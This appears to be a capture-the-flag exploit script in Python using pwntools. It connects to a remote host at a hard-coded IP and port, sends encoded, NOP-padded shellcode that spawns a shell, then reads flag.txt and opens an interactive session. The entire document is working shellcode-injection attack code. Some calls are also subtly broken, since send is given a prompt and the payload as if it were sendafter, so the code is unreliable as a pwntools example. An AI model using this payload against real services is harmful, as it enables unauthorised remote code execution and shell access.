#!/usr/bin/env python3
from pwn import *

context.log_level = 'debug'
context.arch = 'amd64'
HOST = "103.77.175.40"
PORT = 6071

p = remote(HOST, PORT)

raw_shellcode = asm(shellcraft.sh())

bad_bytes = b'\x0f\x05\x00\x0a' 
encoded_payload = encoders.encoder.encode(raw_shellcode, bad_bytes)

payload = encoded_payload.ljust(256, b'\x90')

log.info(f"Payload length: {len(payload)}")
p.send(b'Enter your shellcode (max 256 bytes):\n', payload)

p.send(b'cat flag.txt')

p.interactive()